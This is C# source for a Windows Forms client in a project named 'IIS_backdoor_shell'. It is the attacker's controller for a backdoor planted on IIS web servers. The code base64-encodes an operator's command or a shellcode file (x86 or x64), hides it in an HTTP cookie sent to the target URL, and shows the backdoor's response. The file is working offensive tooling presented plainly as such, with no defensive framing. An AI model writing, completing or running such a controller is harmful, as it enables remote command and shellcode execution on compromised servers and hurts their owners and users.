using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;
using System.Windows.Forms;

namespace IIS_backdoor_shell
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            this.comboBox1.SelectedIndex = 0;
        }
        public string SendDataByGET(string Url, CookieContainer cookie)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(Url);
            if (cookie.Count == 0)
            {
                request.CookieContainer = new CookieContainer();
                cookie = request.CookieContainer;
            }
            else
            {
                request.CookieContainer = cookie;
            }

            request.Method = "GET";
            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            Stream myResponseStream = response.GetResponseStream();
            StreamReader myStreamReader = new StreamReader(myResponseStream, Encoding.GetEncoding("utf-8"));
            string retString = myStreamReader.ReadToEnd();
            myStreamReader.Close();
            myResponseStream.Close();

            return retString;
        }

        public string FileToBase64Str(string filePath)
        {
            string base64Str = string.Empty;
            try
            {
                using (FileStream filestream = new FileStream(filePath, FileMode.Open))
                {
                    byte[] bt = new byte[filestream.Length];

                    filestream.Read(bt, 0, bt.Length);
                    base64Str = Convert.ToBase64String(bt);
                    filestream.Close();
                }

                return base64Str;
            }
            catch (Exception ex)
            {
                return base64Str;
            }
        }

        private void textBox1_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop))
                e.Effect = DragDropEffects.Link;
            else
                e.Effect = DragDropEffects.None;
        }
        private void textBox1_DragDrop(object sender, DragEventArgs e)
        {
            ((TextBox)sender).Text = ((System.Array)e.Data.GetData(DataFormats.FileDrop)).GetValue(0).ToString();
        }

        private void button1_Click(object sender, System.EventArgs e)
        {
            if (textBox3.Text!=""&&textBox1.Text!="")
            {
                CookieContainer cc = new CookieContainer();
                //cc.Add(new System.Uri(textBox1.Text), new Cookie(comboBox1.Text, textBox3.Text));
                //textBox2.Text = SendDataByGET(textBox1.Text, cc);
                if (comboBox1.Text.Equals("shellcode_x86"))
                {
                    var base64Str = FileToBase64Str(textBox3.Text);
                    cc.Add(new System.Uri(textBox1.Text), new Cookie("shellcode", base64Str + "|x86"));
                    textBox2.Text = SendDataByGET(textBox1.Text, cc);
                }
                else if (comboBox1.Text.Equals("shellcode_x64"))
                {
                    var base64Str = FileToBase64Str(textBox3.Text);
                    cc.Add(new System.Uri(textBox1.Text), new Cookie("shellcode", base64Str + "|x64"));
                    textBox2.Text = SendDataByGET(textBox1.Text, cc);
                }
                else
                {
                    byte[] bytes = Encoding.UTF8.GetBytes(textBox3.Text);
                    var base64Str = Convert.ToBase64String(bytes);
                    cc.Add(new System.Uri(textBox1.Text), new Cookie(comboBox1.Text, base64Str));
                    textBox2.Text = SendDataByGET(textBox1.Text, cc);
                }
            }
            else
            {
                MessageBox.Show("请填写命令或URL地址");
            }
            

        }
    }
}
